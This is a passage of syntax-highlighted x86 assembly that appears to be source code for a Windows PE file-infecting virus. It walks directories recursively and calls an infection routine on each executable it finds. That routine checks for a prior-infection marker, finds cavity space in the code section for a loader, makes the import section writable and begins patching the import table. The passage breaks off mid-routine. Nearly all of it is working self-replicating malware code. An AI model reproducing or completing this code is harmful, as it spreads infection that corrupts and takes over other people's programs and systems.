        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Updir0</span><span class="sc0">

</span><span class="sc1">;******  InfectCurrentDir</span><span class="sc0">
         

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">FindMatch</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                    </span><span class="sc1">;target string name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindFirstFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;return a search handle      </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;handle is put into ebx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FindF</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">           
       
 
 </span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindNextFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FindF</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Next</span><span class="sc0">

</span><span class="sc1">;***** End of infect current dir routine</span><span class="sc0">


</span><span class="sc1">;[Findfirst dir]:</span><span class="sc0">

 </span><span class="sc5">FindF</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindClose</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">FindMatch2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0"> 
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindFirstFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Updir0</span><span class="sc0">

 </span><span class="sc5">Find</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FindN</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc3">"."</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Find0</span><span class="sc0">
        
</span><span class="sc1">;[FindNext dir routine]:</span><span class="sc0">

 </span><span class="sc5">FindN</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindNextFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Find</span><span class="sc0">
     
 </span><span class="sc5">Updir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindClose</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
 
 </span><span class="sc5">Updir0</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Depth</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">
 
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DotDot</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindN</span><span class="sc0">         

 </span><span class="sc5">Exit0</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        
 </span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">                                         

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindClose</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;[Restore saved directory]:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DirExe</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_Thread</span><span class="sc0">


</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">pushad</span><span class="sc0">

 </span><span class="sc5">TestFile</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">VirLength</span><span class="sc0">
   
      
</span><span class="sc1">;***** Test if the file is a true PE-executable file</span><span class="sc0">
       
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFileStuff</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitInfectError</span><span class="sc0">                   


       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;save mapping address </span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">            </span><span class="sc1">;Avoid Page Fault</span><span class="sc0">
       </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">                     


       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;edx points to PE-header</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">                 </span><span class="sc1">;true PE exe there?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">                                       
      

</span><span class="sc1">;***** End of EXE-PE test</span><span class="sc0">

        

</span><span class="sc1">;***** Already infected? </span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc3">"IT"</span><span class="sc0">             </span><span class="sc1">;infected?</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitInfectError</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                               

</span><span class="sc1">;**** End of infection test</span><span class="sc0">






           
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                            
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                             </span><span class="sc1">;edi=beginning of optional header</span><span class="sc0">


</span><span class="sc1">;[Compute RVA of first section header]:</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;ebx=Entry Point RVA</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;save it</span><span class="sc0">


       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;cx=size of optionnal header</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;edi points to 1st section header</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;cx= number of sections</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SectN</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;ebx points on 1st section header</span><span class="sc0">


</span><span class="sc1">;[compute last section header address]:</span><span class="sc0">

       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;set eax=0</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;ecx=number of sections -1 </span><span class="sc0">
       
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;esi=first section header</span><span class="sc0">
                                               </span><span class="sc1">;address</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                              </span><span class="sc1">;al=size of a section header</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                                  </span><span class="sc1">;eax=28h*(number of section-1)</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;esi=pointer to last section</span><span class="sc0">
                                               </span><span class="sc1">;header  </span><span class="sc0">
 


</span><span class="sc1">;ebx,edi=beginning of 1st section header</span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;put Entry Point RVA in eax</span><span class="sc0">

</span><span class="sc1">;***** Search code section:</span><span class="sc0">
</span><span class="sc1">;      In : ebx holds file pointer to first section header</span><span class="sc0">
</span><span class="sc1">;         : eax holds Entry Point RVA</span><span class="sc0">
</span><span class="sc1">;***** Out: ebx holds File ptr to the "code section"</span><span class="sc0">
 

        </span><span class="sc5">NotEnough</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          
        </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">FoundCode</span><span class="sc0">  
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">NotEnough</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">

        </span><span class="sc5">FoundCode</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">


</span><span class="sc1">;***** Search code section end</span><span class="sc0">
        



        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;don't want to infect files</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">              </span><span class="sc1">;with rawdata size=0 ...</span><span class="sc0">
                                         </span><span class="sc1">;no real section on disk here</span><span class="sc0">
                                         </span><span class="sc1">;if we try ...file is overwritten!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;don't want to infect files</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">80000000h</span><span class="sc0">                </span><span class="sc1">;with a last section writable</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">             </span><span class="sc1">;surely an exe archive or packed file</span><span class="sc0">
          
</span><span class="sc1">;edi= begin of section headers</span><span class="sc0">
</span><span class="sc1">;ebx= begin of code section</span><span class="sc0">



</span><span class="sc1">;eax= begin of code section header</span><span class="sc0">

        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0"> 
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;restore Map Address  </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;save    "   "</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">LoaderLength</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> 

 

 </span><span class="sc5">Empty</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
         
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">
               
 
          
       
</span><span class="sc1">;[Import table patching routine]:</span><span class="sc0">

       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;save on stack ImageBase</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ImageBase</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;eax= address of the </span><span class="sc0">
                                               </span><span class="sc1">;"import table"</span><span class="sc0">
       


</span><span class="sc1">;[search import section]:</span><span class="sc0">
</span><span class="sc1">;in: edi=map pointer to first section header</span><span class="sc0">


 
        </span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc5">SearchImport</span><span class="sc4">:</span><span class="sc0"> 

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">


        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">FoundImport</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchImport</span><span class="sc0">

</span><span class="sc5">FoundImport</span><span class="sc4">:</span><span class="sc0"> 
        
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">80000000h</span><span class="sc0">       </span><span class="sc1">;set W attribute to </span><span class="sc0">
                                               </span><span class="sc1">;Import section</span><span class="sc0">
 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">            

                                               
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;esi=RVA to the end of import</span><span class="sc0">
                                               </span><span class="sc1">;section </span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">                        </span><span class="sc1">;eax=map pointer to the end of</span><span class="sc0">
                                               </span><span class="sc1">;import section</span><span class="sc0">


        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                  

         
</span><span class="sc1">;[How many dword are free in the end of the import section]: </span><span class="sc0">


</span><span class="sc5">HowManyDW</span><span class="sc4">:</span><span class="sc0">                           

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">HowManyDW</span><span class="sc0"> 

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;we don't use the first free dword</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0"> 



         
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RVA_NewFT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">       
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FP_NewFT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc1">;end of search import section</span><span class="sc0">

 




</span><span class="sc1">;eax=RVA "Imports table"</span><span class="sc0">
</span><span class="sc1">;ebx=RVA  "Sections table"</span><span class="sc0">


</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">                                </span><span class="sc1">;eax=file pointer to Import table</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                                   </span><span class="sc1">;edi= "     "      "   "     "</span><span class="sc0">



</span><span class="sc5">SearchDll</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
